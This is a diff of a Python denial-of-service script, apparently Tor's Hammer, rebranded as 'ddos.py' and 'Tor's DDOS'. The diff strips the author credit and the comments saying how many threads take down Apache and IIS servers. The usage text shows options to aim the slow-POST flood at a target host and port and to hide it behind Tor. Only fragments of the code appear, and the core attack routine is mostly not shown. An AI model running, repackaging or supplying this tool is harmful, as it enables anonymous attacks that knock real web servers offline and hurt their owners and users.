@@ -1,12 +1,5 @@
 #!/usr/bin/python
 
-# this assumes you have the socks.py (http://phiral.net/socks.py) 
-# and terminal.py (http://phiral.net/terminal.py) in the
-# same directory and that you have tor running locally 
-# on port 9050. run with 128 to 256 threads to be effective.
-# kills apache 1.X with ~128, apache 2.X / IIS with ~256
-# not effective on nginx
-
 import os
 import re
 import time
@@ -109,13 +102,13 @@ class httpPost(Thread):
                     pass
  
 def usage():
-    print "./torshammer.py -t <target> [-r <threads> -p <port> -T -h]"
+    print "./ddos.py -t <target> [-r <threads> -p <port> -T -h]"
     print " -t|--target <Hostname|IP>"
     print " -r|--threads <Number of threads> Defaults to 256"
     print " -p|--port <Web Server Port> Defaults to 80"
     print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
     print " -h|--help Shows this help\n" 
-    print "Eg. ./torshammer.py -t 192.168.1.100 -r 256\n"
+    print "Eg. ./ddos.py -t 192.168.1.100 -r 256\n"
 
 def main(argv):
     
@@ -165,18 +158,14 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nShutting down threads...\n"
+            print "\nMohon Tunggu ...\n"
             for t in rthreads:
                 stop_now = True
                 t.running = False
 
 if __name__ == "__main__":
     print "\n/*"
-    print " *"+term.RED + " Tor's Hammer "+term.NORMAL
-    print " * Slow POST DoS Testing Tool"
-    print " * entropy [at] phiral.net"
-    print " * Anon-ymized via Tor"
-    print " * We are Legion."
+    print " *"+term.RED + " Tor's DDOS "+term.NORMAL
     print " */\n"
 
     main(sys.argv[1:])
